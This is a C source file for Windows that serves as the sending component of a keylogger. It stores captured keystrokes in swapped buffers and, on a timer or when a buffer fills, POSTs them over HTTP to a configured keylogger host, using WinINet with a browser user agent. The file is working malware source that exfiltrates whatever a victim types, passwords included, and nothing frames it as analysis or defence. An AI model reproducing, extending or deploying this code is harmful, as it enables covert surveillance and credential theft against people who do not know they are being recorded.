#include "mailman.h"
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <time.h>
#include <stdio.h>


static char messageBuffer1[KEYLOGGER_BUFFER_SIZE] = {0};
static char messageBuffer2[KEYLOGGER_BUFFER_SIZE] = {0};
static char* foregroundBuffer = messageBuffer1;
static char* backgroundBuffer = messageBuffer2;
static HANDLE mutex;
static time_t lastSentTime;

static DWORD WINAPI sendThread(LPVOID pointer){
    WaitForSingleObject(mutex,INFINITE);
    HINTERNET internet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if(internet==NULL){
        goto end;
    }
    HINTERNET connection = InternetConnect(internet, KEYLOGGER_HOSTNAME, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if(connection == NULL){
        InternetCloseHandle(internet);
        goto end;
    }
    HINTERNET request = HttpOpenRequest(connection, "POST", "", NULL, NULL, NULL, 0, 1);
    if(request == NULL){
        InternetCloseHandle(connection);
        InternetCloseHandle(internet);
        goto end;
    }
    HttpSendRequest(request, NULL, 0, backgroundBuffer, strlen(backgroundBuffer));
    InternetCloseHandle(request);
    InternetCloseHandle(connection);
    InternetCloseHandle(internet);

    end:
    memset(backgroundBuffer, 0, KEYLOGGER_BUFFER_SIZE);
    ReleaseMutex(mutex);
}

static void swapBuffers(){
    WaitForSingleObject(mutex,INFINITE);
    char* tmp = foregroundBuffer;
    foregroundBuffer = backgroundBuffer;
    backgroundBuffer = tmp;
    ReleaseMutex(mutex);
}

//guardar las teclas
void addKeyToBuffer (const char* letter) {
    size_t usedBufferBytes = strlen(foregroundBuffer);
    size_t letterSize = strlen(letter);
    size_t remainingBufferBytes = KEYLOGGER_BUFFER_SIZE - usedBufferBytes;
    time_t currentTime = time(NULL);
    time_t elapsedTime = currentTime - lastSentTime;
    if(letterSize>remainingBufferBytes || elapsedTime > KEYLOGGER_SEND_TIME){
        lastSentTime = currentTime;
        sendBuffer();
    }
    strcat(foregroundBuffer,letter);

}

void sendBuffer (){
    if(strlen(foregroundBuffer) == 0){
        return;
    }
    swapBuffers();
    CreateThread(NULL, 0, sendThread, NULL, 0, NULL);  
}

void initSender (){
    lastSentTime=time(NULL);
    mutex = CreateMutex(NULL, 0, NULL);
}

void CleanUpSender (){
    WaitForSingleObject(mutex, INFINITE);
    ReleaseMutex(mutex);
    CloseHandle(mutex);
}